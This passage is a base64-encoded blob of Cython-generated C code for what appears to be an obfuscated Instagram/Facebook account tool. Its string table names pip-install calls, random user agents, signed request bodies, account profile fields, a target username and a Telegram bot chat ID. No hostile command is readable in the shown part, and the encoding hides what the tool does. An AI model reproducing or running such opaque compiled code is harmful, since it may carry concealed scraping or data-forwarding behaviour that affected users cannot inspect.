6ZW9mKF9fcHl4X2tfbjEpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX24yLCBzaXplb2YoX19weXhfa19uMiksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfbmFtZSwgc2l6ZW9mKF9fcHl4X2tfbmFtZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfbmFtZV8yLCBzaXplb2YoX19weXhfa19uYW1lXzIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX25leHQsIHNpemVvZihfX3B5eF9rX25leHQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX250LCBzaXplb2YoX19weXhfa19udCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfbnVsbCwgc2l6ZW9mKF9fcHl4X2tfbnVsbCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCwgc2l6ZW9mKF9fcHl4X2tfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfbywgc2l6ZW9mKF9fcHl4X2tfbyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfb2ssIHNpemVvZihfX3B5eF9rX29rKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19vcCwgc2l6ZW9mKF9fcHl4X2tfb3ApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX29wZW4sIHNpemVvZihfX3B5eF9rX29wZW4pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX29yaWdpbiwgc2l6ZW9mKF9fcHl4X2tfb3JpZ2luKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19vcywgc2l6ZW9mKF9fcHl4X2tfb3MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX291dHB1dCwgc2l6ZW9mKF9fcHl4X2tfb3V0cHV0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19vdywgc2l6ZW9mKF9fcHl4X2tfb3cpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3BhcmFtcywgc2l6ZW9mKF9fcHl4X2tfcGFyYW1zKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF9iczQsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX2JzNCksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfY29sb3JhbWEsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX2NvbG9yYW1hKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF9oYXNobGliLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9oYXNobGliKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF9qc29uLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9qc29uKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF9weXRob25fY2ZvbnRzLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF9weXRob25fY2ZvbnRzKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF9yYW5kb20sIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX3JhbmRvbSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcGlwX2luc3RhbGxfcmUsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX3JlKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF9yZXF1ZXN0cywgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfcmVxdWVzdHMpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3BpcF9pbnN0YWxsX3JpY2gsIHNpemVvZihfX3B5eF9rX3BpcF9pbnN0YWxsX3JpY2gpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3BpcF9pbnN0YWxsX3RocmVhZGluZywgc2l6ZW9mKF9fcHl4X2tfcGlwX2luc3RhbGxfdGhyZWFkaW5nKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF90aW1lLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF90aW1lKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF91c2VyX2FnZW50LCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF91c2VyX2FnZW50KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waXBfaW5zdGFsbF91dWlkLCBzaXplb2YoX19weXhfa19waXBfaW5zdGFsbF91dWlkKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19waywgc2l6ZW9mKF9fcHl4X2tfcGspLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3BvcCwgc2l6ZW9mKF9fcHl4X2tfcG9wKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19wb3N0LCBzaXplb2YoX19weXhfa19wb3N0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19wcCwgc2l6ZW9mKF9fcHl4X2tfcHApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3BwcHAsIHNpemVvZihfX3B5eF9rX3BwcHApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3ByaW50LCBzaXplb2YoX19weXhfa19wcmludCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcHJpbnRpbmcsIHNpemVvZihfX3B5eF9rX3ByaW50aW5nKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19wcmlvcml0eSwgc2l6ZW9mKF9fcHl4X2tfcHJpb3JpdHkpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3Fjb21fZW5fVVNfNTQ1OTg2LCBzaXplb2YoX19weXhfa19xY29tX2VuX1VTXzU0NTk4NiksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfcXVhbG5hbWUsIHNpemVvZihfX3B5eF9rX3F1YWxuYW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19xdWVyeSwgc2l6ZW9mKF9fcHl4X2tfcXVlcnkpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3IsIHNpemVvZihfX3B5eF9rX3IpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JhbmRfaWRzLCBzaXplb2YoX19weXhfa19yYW5kX2lkcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmFuZGludCwgc2l6ZW9mKF9fcHl4X2tfcmFuZGludCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmFuZG9tLCBzaXplb2YoX19weXhfa19yYW5kb20pLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JhbmRyYW5nZSwgc2l6ZW9mKF9fcHl4X2tfcmFuZHJhbmdlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yYW5nZSwgc2l6ZW9mKF9fcHl4X2tfcmFuZ2UpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlLCBzaXplb2YoX19weXhfa19yZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmVhZCwgc2l6ZW9mKF9fcHl4X2tfcmVhZCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmVkLCBzaXplb2YoX19weXhfa19yZWQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlZmVyZXIsIHNpemVvZihfX3B5eF9rX3JlZmVyZXIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlbmRlciwgc2l6ZW9mKF9fcHl4X2tfcmVuZGVyKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yZXF1ZXN0cywgc2l6ZW9mKF9fcHl4X2tfcmVxdWVzdHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JlczEsIHNpemVvZihfX3B5eF9rX3JlczEpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3Jlc3BvbnNlLCBzaXplb2YoX19weXhfa19yZXNwb25zZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmVzdCwgc2l6ZW9mKF9fcHl4X2tfcmVzdCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfcmljaF9jb25zb2xlLCBzaXplb2YoX19weXhfa19yaWNoX2NvbnNvbGUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JpY2hfcGFuZWwsIHNpemVvZihfX3B5eF9rX3JpY2hfcGFuZWwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3JuZCwgc2l6ZW9mKF9fcHl4X2tfcm5kKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19yciwgc2l6ZW9mKF9fcHl4X2tfcnIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3NlYXJjaCwgc2l6ZW9mKF9fcHl4X2tfc2VhcmNoKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zZW5kLCBzaXplb2YoX19weXhfa19zZW5kKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zZW5kTWVzc2FnZV9jaGF0X2lkLCBzaXplb2YoX19weXhfa19zZW5kTWVzc2FnZV9jaGF0X2lkKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa19zZXJ2ZXJfdGltZXN0YW1wcywgc2l6ZW9mKF9fcHl4X2tfc2VydmVyX3RpbWVzdGFtcHMpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3NldF9uYW1lLCBzaXplb2YoX19weXhfa19zZXRfbmFtZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc2lnbmVkX2JvZHksIHNpemVvZihfX3B5eF9rX3NpZ25lZF9ib2R5KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zbGVlcCwgc2l6ZW9mKF9fcHl4X2tfc2xlZXApLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3NwYWNlLCBzaXplb2YoX19weXhfa19zcGFjZSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3BlYywgc2l6ZW9mKF9fcHl4X2tfc3BlYyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3BsaXQsIHNpemVvZihfX3B5eF9rX3NwbGl0KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zcGxpdGxpbmVzLCBzaXplb2YoX19weXhfa19zcGxpdGxpbmVzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zcywgc2l6ZW9mKF9fcHl4X2tfc3MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3N0YXJ0LCBzaXplb2YoX19weXhfa19zdGFydCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfc3Rkb3V0LCBzaXplb2YoX19weXhfa19zdGRvdXQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3N1YnByb2Nlc3MsIHNpemVvZihfX3B5eF9rX3N1YnByb2Nlc3MpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3N5cywgc2l6ZW9mKF9fcHl4X2tfc3lzKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa19zeXN0ZW0sIHNpemVvZihfX3B5eF9rX3N5c3RlbSksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdCwgc2l6ZW9mKF9fcHl4X2tfdCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGFyZ2V0LCBzaXplb2YoX19weXhfa190YXJnZXQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3Rlc3QsIHNpemVvZihfX3B5eF9rX3Rlc3QpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3RleHQsIHNpemVvZihfX3B5eF9rX3RleHQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3RleHRfMiwgc2l6ZW9mKF9fcHl4X2tfdGV4dF8yKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa190aHJlYWRpbmcsIHNpemVvZihfX3B5eF9rX3RocmVhZGluZyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGhyZWFkcywgc2l6ZW9mKF9fcHl4X2tfdGhyZWFkcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGhyb3csIHNpemVvZihfX3B5eF9rX3Rocm93KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190aW1lLCBzaXplb2YoX19weXhfa190aW1lKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190bCwgc2l6ZW9mKF9fcHl4X2tfdGwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3RsX3R4dCwgc2l6ZW9mKF9fcHl4X2tfdGxfdHh0KSwgMCwgMSwgMH0sIFxuICB7X19weXhfa190bGwsIHNpemVvZihfX3B5eF9rX3RsbCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdGxsX2xvY2Fsc19nZW5leHByLCBzaXplb2YoX19weXhfa190bGxfbG9jYWxzX2dlbmV4cHIpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3Rvaywgc2l6ZW9mKF9fcHl4X2tfdG9rKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa190b3RhbCwgc2l6ZW9mKF9fcHl4X2tfdG90YWwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3RydWUsIHNpemVvZihfX3B5eF9rX3RydWUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3VfMV9pLCBzaXplb2YoX19weXhfa191XzFfaSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfdWEsIHNpemVvZihfX3B5eF9rX3VhKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa191aWQsIHNpemVvZihfX3B5eF9rX3VpZCksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdXNlciwgc2l6ZW9mKF9fcHl4X2tfdXNlciksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdXNlcklELCBzaXplb2YoX19weXhfa191c2VySUQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3VzZXJfYWdlbnQsIHNpemVvZihfX3B5eF9rX3VzZXJfYWdlbnQpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3VzZXJfYWdlbnRfMiwgc2l6ZW9mKF9fcHl4X2tfdXNlcl9hZ2VudF8yKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa191c2VybmFtZSwgc2l6ZW9mKF9fcHl4X2tfdXNlcm5hbWUpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3VzZXJuYW1lX2NyaXN0aWFubywgc2l6ZW9mKF9fcHl4X2tfdXNlcm5hbWVfY3Jpc3RpYW5vKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa191dGZfOCwgc2l6ZW9mKF9fcHl4X2tfdXRmXzgpLCAwLCAxLCAwfSwgXG4gIHtfX3B5eF9rX3V0aWwsIHNpemVvZihfX3B5eF9rX3V0aWwpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3V1aSwgc2l6ZW9mKF9fcHl4X2tfdXVpKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa191dWlkLCBzaXplb2YoX19weXhfa191dWlkKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa191dWlkNCwgc2l6ZW9mKF9fcHl4X2tfdXVpZDQpLCAwLCAxLCAxfSwgXG4gIHtfX3B5eF9rX3V1dSwgc2l6ZW9mKF9fcHl4X2tfdXV1KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa191dXVfbG9jYWxzX2dlbmV4cHIsIHNpemVvZihfX3B5eF9rX3V1dV9sb2NhbHNfZ2VuZXhwciksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdmFsdWUsIHNpemVvZihfX3B5eF9rX3ZhbHVlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa192YXJpYWJsZXMsIHNpemVvZihfX3B5eF9rX3ZhcmlhYmxlcyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfdywgc2l6ZW9mKF9fcHl4X2tfdyksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfd2ViYnJvd3Nlciwgc2l6ZW9mKF9fcHl4X2tfd2ViYnJvd3NlciksIDAsIDEsIDF9LCBcbiAge19fcHl4X2tfd3JpdGUsIHNpemVvZihfX3B5eF9rX3dyaXRlKSwgMCwgMSwgMX0sIFxuICB7X19weXhfa194LCBzaXplb2YoX19weXhfa194KSwgMCwgMSwgMX0sIFxuICB7X19weXhfa194X2ZiX2ZyaWVuZGx5X25hbWUsIHNpemVvZihfX3B5eF9rX3hfZmJfZnJpZW5kbHlfbmFtZSksIDAsIDEsIDB9LCBcbiAge19fcHl4X2tfeF9mYl9sc2QsIHNpemVvZihfX3B5eF9rX3hfZmJfbHNkKSwgMCwgMSwgMH0sIFxuICB7X19weXhfa195eSwgc2l6ZW9mKF9fcHl4X2tfeXkpLCAwLCAxLCAxfSwgXG4gIHswLCAwLCAwLCAwLCAwfVxufTtcblxuc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcyk7XG5cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDYWNoZWRCdWlsdGlucyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19weXhfYnVpbHRpbl9wcmludCA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3ByaW50KTsgaWYgKCFfX3B5eF9idWlsdGluX3ByaW50KSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9idWlsdGluX2lucHV0ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaW5wdXQpOyBpZiAoIV9fcHl4X2J1aWx0aW5faW5wdXQpIF9fUFlYX0VSUigwLCA4OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5fb3BlbiA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X29wZW4pOyBpZiAoIV9fcHl4X2J1aWx0aW5fb3BlbikgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5fcmFuZ2UgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yYW5nZSk7IGlmICghX19weXhfYnVpbHRpbl9yYW5nZSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gIHJldHVybiAwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIHJldHVybiAtMTtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzIiwgMCk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjA4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSkpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMF0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzJdKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVszXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10pKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVszXSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzRdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdGxfdHh0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfdyk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0pKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzRdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSk7XG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdID0gUHlUdXBsZV9QYWNrKDMsIFB5X05vbmUsIFB5X05vbmUsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdKSkgX19QWVhfRVJSKDAsIDE1NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs1XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGssIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdKSkgX19QWVhfRVJSKDAsIDIzMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs3XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZnVsbF9uYW1lLCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs3XSkpIF9fUFlYX0VSUigwLCAyMzQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzddKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZvbGxvd2VyX2NvdW50LCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSkpIF9fUFlYX0VSUigwLCAyMzUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOF0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZvbGxvd2luZ19jb3VudCwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0pKSBfX1BZWF9FUlIoMCwgMjM2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs5XSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbWVkaWFfY291bnQsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSkpIF9fUFlYX0VSUigwLCAyMzcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTBdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMF0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX3ByaXZhdGUsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzExXSkpIF9fUFlYX0VSUigwLCAyMzgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTFdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jpb2dyYXBoeSwgUHlfTm9uZSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTJdKSkgX19QWVhfRVJSKDAsIDIzOSwgX19weXhfTDFfZXJyb3IpXG4gIF9